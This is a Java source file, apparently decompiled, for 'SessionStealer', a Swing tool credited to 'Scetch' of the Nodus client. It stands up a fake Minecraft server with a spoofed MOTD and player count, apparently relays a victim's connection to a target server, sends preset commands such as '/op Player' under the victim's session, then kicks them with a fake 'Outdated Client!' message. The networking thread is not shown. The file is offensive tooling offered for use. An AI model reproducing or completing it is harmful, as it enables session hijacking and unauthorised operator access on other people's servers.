package me.Scetch.SessionStealer;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import me.Scetch.SessionStealer.ThreadClient;

public class SessionStealer
extends JFrame
implements ActionListener {
    public static Socket socketIn;
    public static Socket socketOut;
    public static ServerSocket serverSocket;
    public static DataInputStream DIIn;
    public static DataInputStream DIOut;
    public static DataOutputStream DOIn;
    public static DataOutputStream DOOut;
    public static String targetServer;
    public static String motd;
    public static String kickMessage;
    public static String[] messages;
    public static int fakeOnline;
    public static int fakeMax;
    public static int fakePort;
    public static int targetPort;
    public static boolean closeConnection;
    public static String minecraftUsername;
    public JButton buttonStart;
    public static JTextArea logArea;
    public JTextField textTargetServer;
    public JTextField textTargetPort;
    public JTextField textMessages;
    public JTextField textMOTD;
    public JTextField textOnline;
    public JTextField textMax;
    public JTextField textKickMessage;
    public JTextField textListenPort;
    public JLabel labelTargetServer;
    public JLabel labelTargetPort;
    public JLabel labelMessages;
    public JLabel labelMOTD;
    public JLabel labelOnline;
    public JLabel labelMax;
    public JLabel labelKickMessage;
    public JLabel labelListenPort;
    public JLabel labelLogArea;

    static {
        messages = new String[]{""};
    }

    public static void main(String[] args) {
        SessionStealer sessionstealer = new SessionStealer();
        sessionstealer.setTitle("[Nodus] SessionStealer");
        sessionstealer.setSize(475, 440);
        sessionstealer.setResizable(false);
        sessionstealer.setDefaultCloseOperation(3);
        sessionstealer.setVisible(true);
    }

    public SessionStealer() {
        JPanel panel = new JPanel();
        this.getContentPane().add(panel);
        panel.setLayout(null);
        this.labelTargetServer = new JLabel("Target Server:");
        this.labelTargetServer.setBounds(5, 5, 200, 25);
        this.textTargetServer = new JTextField();
        this.textTargetServer.setBounds(5, 25, 200, 25);
        this.labelTargetPort = new JLabel("Target Port:");
        this.labelTargetPort.setBounds(5, 50, 200, 25);
        this.textTargetPort = new JTextField();
        this.textTargetPort.setBounds(5, 70, 200, 25);
        this.labelMessages = new JLabel("Messages (Seperated by \",\"):");
        this.labelMessages.setBounds(5, 95, 200, 25);
        this.textMessages = new JTextField();
        this.textMessages.setBounds(5, 115, 200, 25);
        this.labelMOTD = new JLabel("MOTD:");
        this.labelMOTD.setBounds(5, 140, 200, 25);
        this.textMOTD = new JTextField();
        this.textMOTD.setBounds(5, 160, 200, 25);
        this.labelOnline = new JLabel("Users Online:");
        this.labelOnline.setBounds(5, 185, 200, 25);
        this.textOnline = new JTextField();
        this.textOnline.setBounds(5, 205, 200, 25);
        this.labelMax = new JLabel("Max Users Online:");
        this.labelMax.setBounds(5, 230, 200, 25);
        this.textMax = new JTextField();
        this.textMax.setBounds(5, 250, 200, 25);
        this.labelKickMessage = new JLabel("Kick Message:");
        this.labelKickMessage.setBounds(5, 275, 200, 25);
        this.textKickMessage = new JTextField();
        this.textKickMessage.setBounds(5, 295, 200, 25);
        this.labelListenPort = new JLabel("Listen Port:");
        this.labelListenPort.setBounds(5, 320, 200, 25);
        this.textListenPort = new JTextField();
        this.textListenPort.setBounds(5, 340, 200, 25);
        this.buttonStart = new JButton("Start Server");
        this.buttonStart.setBounds(5, 375, 200, 25);
        this.buttonStart.addActionListener(this);
        this.labelLogArea = new JLabel("Log:");
        this.labelLogArea.setBounds(220, 5, 200, 25);
        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setBorder(BorderFactory.createLineBorder(this.getForeground(), 0));
        JScrollPane scrollPane = new JScrollPane(logArea);
        scrollPane.setBounds(220, 25, 245, 376);
        panel.add(this.labelTargetServer);
        panel.add(this.textTargetServer);
        panel.add(this.labelTargetPort);
        panel.add(this.textTargetPort);
        panel.add(this.labelMessages);
        panel.add(this.textMessages);
        panel.add(this.labelMOTD);
        panel.add(this.textMOTD);
        panel.add(this.labelOnline);
        panel.add(this.textOnline);
        panel.add(this.labelMax);
        panel.add(this.textMax);
        panel.add(this.labelKickMessage);
        panel.add(this.textKickMessage);
        panel.add(this.labelListenPort);
        panel.add(this.textListenPort);
        panel.add(this.buttonStart);
        panel.add(this.labelLogArea);
        panel.add(scrollPane);
        SessionStealer.log("***************************************\n   SessionStealer created by Scetch. \n                        Nodus FTW.");
        SessionStealer.log("***************************************\n");
        SessionStealer.log("GUI Loaded.");
        this.loadConfig();
    }

    public static void log(String s) {
        logArea.append("[*]" + s + "\n");
    }

    public static String readString(DataInputStream DIS) throws Exception {
        int i = DIS.readShort();
        String s = "";
        int j = 0;
        while (j < i) {
            s = String.valueOf(s) + DIS.readChar();
            ++j;
        }
        return s;
    }

    public static void writeString(String s, DataOutputStream DOS) throws Exception {
        DOS.writeShort(s.length());
        DOS.writeChars(s);
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        if (e.getSource() == this.buttonStart) {
            if (this.textTargetServer.getText().equals("") || this.textTargetPort.getText().equals("") || this.textMessages.getText().equals("") || this.textMOTD.getText().equals("") || this.textOnline.getText().equals("") || this.textMax.getText().equals("") || this.textKickMessage.getText().equals("") || this.textListenPort.getText().equals("")) {
                JOptionPane.showMessageDialog(this, "Fill in all fields.", "Error", 0);
                return;
            }
            try {
                targetServer = this.textTargetServer.getText();
                targetPort = Integer.parseInt(this.textTargetPort.getText());
                if (this.textMessages.getText().contains(",")) {
                    messages = this.textMessages.getText().trim().split(",");
                } else {
                    SessionStealer.messages[0] = this.textMessages.getText();
                }
                int i = 0;
                while (i < messages.length) {
                    SessionStealer.messages[i] = messages[i].trim();
                    ++i;
                }
                motd = this.textMOTD.getText();
                fakeOnline = Integer.parseInt(this.textOnline.getText());
                fakeMax = Integer.parseInt(this.textMax.getText());
                fakePort = Integer.parseInt(this.textListenPort.getText());
                kickMessage = this.textKickMessage.getText();
            }
            catch (NumberFormatException e2) {
                JOptionPane.showMessageDialog(this, "Target Port, Online Users, Max Online Users and Listen Port must be numbers.", "Error", 0);
                return;
            }
            this.saveConfig();
            this.textTargetServer.setEditable(false);
            this.textTargetPort.setEditable(false);
            this.textMessages.setEditable(false);
            this.textMOTD.setEditable(false);
            this.textOnline.setEditable(false);
            this.textMax.setEditable(false);
            this.textListenPort.setEditable(false);
            this.textKickMessage.setEditable(false);
            this.buttonStart.setEnabled(false);
            ThreadClient threadClient = new ThreadClient();
            threadClient.start();
        }
    }

    public static File getConfigDirectory() {
        String userHome = System.getProperty("user.home");
        if (userHome == null) {
            throw new IllegalStateException("user.home==null");
        }
        File home = new File(userHome);
        File configDirectory = new File(home, "/.sessionstealer");
        if (!configDirectory.exists() && !configDirectory.mkdir()) {
            throw new IllegalStateException(configDirectory.toString());
        }
        return configDirectory;
    }

    public static File getConfig() {
        return new File(SessionStealer.getConfigDirectory(), "/config.ini");
    }

    public void loadConfig() {
        SessionStealer.log("Loading Config.");
        try {
            String line;
            if (!SessionStealer.getConfig().exists()) {
                this.createDefaultConfig();
            }
            BufferedReader BR = new BufferedReader(new FileReader(SessionStealer.getConfig()));
            while ((line = BR.readLine()) != null) {
                int i = line.indexOf("=");
                if (i < 1) continue;
                String variable = line.substring(0, i).trim().toLowerCase();
                String value = line.substring(i + 1).trim();
                if (variable.equalsIgnoreCase("target-server")) {
                    this.textTargetServer.setText(value);
                    continue;
                }
                if (variable.equalsIgnoreCase("target-port")) {
                    this.textTargetPort.setText(value);
                    continue;
                }
                if (variable.equalsIgnoreCase("messages")) {
                    this.textMessages.setText(value);
                    continue;
                }
                if (variable.equalsIgnoreCase("motd")) {
                    this.textMOTD.setText(value);
                    continue;
                }
                if (variable.equalsIgnoreCase("users-online")) {
                    this.textOnline.setText(value);
                    continue;
                }
                if (variable.equalsIgnoreCase("max-online")) {
                    this.textMax.setText(value);
                    continue;
                }
                if (variable.equalsIgnoreCase("kick-message")) {
                    this.textKickMessage.setText(value);
                    continue;
                }
                if (!variable.equalsIgnoreCase("listen-port")) continue;
                this.textListenPort.setText(value);
            }
            BR.close();
        }
        catch (Exception e) {
            SessionStealer.log("Error Loading Config.");
        }
        SessionStealer.log("Config Loaded.");
    }

    public void createDefaultConfig() throws Exception {
        SessionStealer.log("Creating Default Config.");
        BufferedWriter BW = new BufferedWriter(new FileWriter(SessionStealer.getConfig()));
        BW.write("#SessionStealer created by Scetch.\r\n");
        BW.write("target-server=localhost\r\n");
        BW.write("target-port=25565\r\n");
        BW.write("messages=/op Player, /op Player1\r\n");
        BW.write("motd=Minecraft Server\r\n");
        BW.write("users-online=23\r\n");
        BW.write("max-online=50\r\n");
        BW.write("kick-message=Outdated Client!\r\n");
        BW.write("listen-port=25565\r\n");
        BW.close();
    }

    public void saveConfig() {
        SessionStealer.log("Saving Config.");
        try {
            BufferedWriter BW = new BufferedWriter(new FileWriter(SessionStealer.getConfig()));
            BW.write("#SessionStealer created By Scetch.\r\n");
            BW.write("target-server=" + this.textTargetServer.getText() + "\r\n");
            BW.write("target-port=" + this.textTargetPort.getText() + "\r\n");
            BW.write("messages=" + this.textMessages.getText() + "\r\n");
            BW.write("motd=" + this.textMOTD.getText() + "\r\n");
            BW.write("users-online=" + this.textOnline.getText() + "\r\n");
            BW.write("max-online=" + this.textMax.getText() + "\r\n");
            BW.write("kick-message=" + this.textKickMessage.getText() + "\r\n");
            BW.write("listen-port=" + this.textListenPort.getText() + "\r\n");
            BW.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
